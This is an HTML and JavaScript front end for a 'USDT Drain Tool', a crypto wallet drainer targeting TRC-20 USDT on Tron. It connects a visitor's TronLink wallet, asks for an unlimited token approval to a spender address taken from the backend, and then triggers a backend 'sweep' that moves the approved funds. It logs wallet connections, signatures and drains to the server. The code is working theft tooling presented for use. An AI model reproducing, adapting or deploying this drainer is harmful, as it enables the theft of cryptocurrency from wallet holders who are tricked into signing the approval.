<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>USDT Drain Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            padding: 2rem 1rem;
            color: #f1f5f9;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #60a5fa, #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.25rem;
        }

        .sub {
            color: #94a3b8;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            border-left: 2px solid #3b82f6;
            padding-left: 0.75rem;
        }

        .btn {
            background: #3b82f6;
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.5rem;
            border-radius: 60px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            margin-top: 0.5rem;
        }

        .btn-secondary {
            background: #334155;
        }

        .btn-secondary:hover {
            background: #475569;
        }

        .btn-danger {
            background: #dc2626;
        }

        .btn-danger:hover {
            background: #b91c1c;
        }

        .btn-success {
            background: #10b981;
        }

        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }

        .btn:active {
            transform: translateY(1px);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .info-label {
            font-weight: 500;
            color: #94a3b8;
        }

        .info-value {
            font-family: monospace;
            word-break: break-all;
            text-align: right;
            max-width: 60%;
        }

        .address-badge {
            background: #1e293b;
            padding: 0.25rem 0.75rem;
            border-radius: 40px;
            font-family: monospace;
            font-size: 0.8rem;
        }

        .status {
            background: #0f172a;
            border-radius: 20px;
            padding: 0.8rem 1rem;
            margin-top: 1rem;
            font-size: 0.85rem;
            font-family: monospace;
            border-left: 3px solid #3b82f6;
        }

        .flex {
            display: flex;
            gap: 0.8rem;
            flex-wrap: wrap;
        }

        .flex .btn {
            flex: 1;
            margin-top: 0;
        }

        input {
            background: #0f172a;
            border: 1px solid #334155;
            padding: 0.7rem 1rem;
            border-radius: 40px;
            color: white;
            width: 100%;
            font-family: monospace;
            margin: 0.5rem 0;
        }

        label {
            font-size: 0.75rem;
            color: #94a3b8;
            margin-top: 0.5rem;
            display: block;
        }

        hr {
            border-color: #334155;
            margin: 1rem 0;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>💸 USDT Drain Tool</h1>
        <div class="sub">TRC-20 | One‑click approval + sweep</div>

        <!-- Wallet -->
        <button id="connectBtn" class="btn">🔌 Connect TronLink</button>
        <div id="walletInfo" style="display: none;">
            <div class="info-row">
                <span class="info-label">📍 Address</span>
                <span class="info-value address-badge" id="addressDisplay"></span>
            </div>
            <div class="info-row">
                <span class="info-label">💰 USDT Balance</span>
                <span class="info-value" id="usdtBalance">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">⚡ TRX Balance</span>
                <span class="info-value" id="trxBalance">—</span>
            </div>
        </div>
    </div>

    <!-- Approval + Drain -->
    <div class="card" id="actionCard" style="display: none;">
        <div class="info-row">
            <span class="info-label">🎯 Spender (contract / EOA)</span>
            <span class="info-value address-badge" id="spenderAddress">—</span>
        </div>
        <div class="info-row">
            <span class="info-label">📄 Max approval value</span>
            <span class="info-value" id="maxApprove">—</span>
        </div>

        <label>🔓 Approve amount (USDT)</label>
        <div class="flex">
            <input type="text" id="approveAmount" placeholder="e.g. 1000 or 'max'" value="max">
            <button id="approveBtn" class="btn-secondary">✅ Approve USDT</button>
        </div>

        <hr>

        <button id="drainBtn" class="btn-danger">💀 Drain USDT</button>
        <div id="statusMsg" class="status">⏳ Waiting for connection...</div>
    </div>
</div>

<script>
    // ---------- GLOBALS ----------
    let userAddress = null;
    let tronWebInstance = null;
    let configData = { drainAddress: '', drainContract: '', maxApprove: '' };
    let usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // fallback, will be updated from config if needed

    // ---------- HELPER: log event to backend ----------
    async function logEvent(type, address, txId = '', amount = '') {
        try {
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, address, txId, amount })
            });
        } catch(e) { console.warn('event log failed', e); }
    }

    // ---------- FETCH CONFIG ----------
    async function loadConfig() {
        try {
            const res = await fetch('/api/config');
            const data = await res.json();
            configData = {
                drainAddress: data.drainAddress || '',
                drainContract: data.drainContract || '',
                maxApprove: data.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935'
            };
            if (data.usdtContract) usdtContractAddress = data.usdtContract;
            document.getElementById('spenderAddress').innerText = configData.drainContract || configData.drainAddress || '❌ Not set';
            document.getElementById('maxApprove').innerText = configData.maxApprove === '115792089237316195423570985008687907853269984665640564039457584007913129639935'
                ? '∞ (unlimited)' : configData.maxApprove;
        } catch(e) {
            console.error('Config error', e);
            document.getElementById('statusMsg').innerHTML = '⚠️ Failed to load backend config.';
        }
    }

    // ---------- UPDATE BALANCES (via backend) ----------
    async function updateBalances(address) {
        if (!address) return;
        try {
            const res = await fetch('/api/balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address })
            });
            if (!res.ok) throw new Error('Balance fetch failed');
            const data = await res.json();
            document.getElementById('usdtBalance').innerText = data.usdt.toFixed(2) + ' USDT';
            document.getElementById('trxBalance').innerText = data.trx.toFixed(2) + ' TRX';
        } catch(err) {
            document.getElementById('usdtBalance').innerText = 'Error';
            document.getElementById('trxBalance').innerText = 'Error';
        }
    }

    // ---------- APPROVE USDT (on-chain via TronLink) ----------
    async function approveUSDT(spender, amountRaw) {
        if (!tronWebInstance || !userAddress) throw new Error('Wallet not connected');
        const contract = await tronWebInstance.contract().at(usdtContractAddress);
        let amountWei;
        const isMax = (amountRaw === 'max' || amountRaw === '' || amountRaw.toLowerCase() === 'max');
        if (isMax) {
            amountWei = configData.maxApprove;
        } else {
            let amountNum = parseFloat(amountRaw);
            if (isNaN(amountNum)) throw new Error('Invalid amount');
            amountWei = tronWebInstance.toSun(amountNum * 1e6); // USDT has 6 decimals, toSun converts from TRX scale? No – careful: USDT decimals = 6
            // Actually tronWeb.toSun multiplies by 1e6. So toSun(amount) works for 6 decimals.
            // But to be safe:
            amountWei = Math.floor(amountNum * 1e6).toString();
        }

        const tx = await contract.approve(spender, amountWei).send();
        console.log('Approve tx:', tx);
        await logEvent('approve_signed', userAddress, tx, amountRaw);
        return tx;
    }

    // ---------- CALL BACKEND SWEEP ----------
    async function callSweep() {
        if (!userAddress) throw new Error('No wallet connected');
        const res = await fetch('/api/sweep', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: userAddress })
        });
        const data = await res.json();
        if (!data.success) throw new Error(data.error || 'Sweep failed');
        await logEvent('drain_sent', userAddress, data.txId, '');
        return data;
    }

    // ---------- TRONLINK CONNECTION ----------
    async function connectTronLink() {
        if (!window.tronLink || !window.tronLink.ready) {
            alert('Please install TronLink (https://tronlink.org)');
            return false;
        }
        try {
            const accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (!accounts || accounts.length === 0) throw new Error('No accounts');
            userAddress = accounts[0];
            tronWebInstance = window.tronLink.tronWeb;
            // Show wallet section
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('walletInfo').style.display = 'block';
            document.getElementById('actionCard').style.display = 'block';
            document.getElementById('addressDisplay').innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
            await updateBalances(userAddress);
            await logEvent('wallet_connected', userAddress);
            document.getElementById('statusMsg').innerHTML = '✅ Connected. You can now approve USDT.';
            return true;
        } catch (err) {
            console.error(err);
            document.getElementById('statusMsg').innerHTML = '❌ Connection failed: ' + err.message;
            return false;
        }
    }

    // ---------- EVENT HANDLERS ----------
    async function handleApprove() {
        if (!tronWebInstance || !userAddress) {
            alert('Connect wallet first');
            return;
        }
        const spender = configData.drainContract || configData.drainAddress;
        if (!spender) {
            alert('No drain contract or address configured on backend');
            return;
        }
        const amountInput = document.getElementById('approveAmount').value.trim();
        const statusDiv = document.getElementById('statusMsg');
        statusDiv.innerHTML = '⏳ Approving USDT... check TronLink popup.';
        try {
            const tx = await approveUSDT(spender, amountInput);
            statusDiv.innerHTML = `✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`;
        } catch (err) {
            statusDiv.innerHTML = `❌ Approve failed: ${err.message}`;
            console.error(err);
        }
    }

    async function handleDrain() {
        if (!userAddress) {
            alert('Connect wallet first');
            return;
        }
        const statusDiv = document.getElementById('statusMsg');
        statusDiv.innerHTML = '⏳ Sending drain request...';
        try {
            const result = await callSweep();
            statusDiv.innerHTML = `💀 Drained successfully! TX: <a href="https://tronscan.org/#/transaction/${result.txId}" target="_blank">${result.txId.slice(0,10)}...</a>`;
            // Refresh balances after drain attempt
            setTimeout(() => updateBalances(userAddress), 4000);
        } catch (err) {
            statusDiv.innerHTML = `❌ Drain error: ${err.message}. Make sure approval is done first.`;
        }
    }

    // ---------- INIT ----------
    window.addEventListener('load', () => {
        loadConfig();
        document.getElementById('connectBtn').addEventListener('click', connectTronLink);
        document.getElementById('approveBtn').addEventListener('click', handleApprove);
        document.getElementById('drainBtn').addEventListener('click', handleDrain);
        // detect TronLink presence
        if (window.tronLink && window.tronLink.ready) {
            document.getElementById('statusMsg').innerHTML = '🟢 TronLink detected. Click "Connect" above.';
        } else {
            document.getElementById('statusMsg').innerHTML = '⚠️ TronLink not detected. Install extension.';
        }
    });
</script>
</body>
</html>
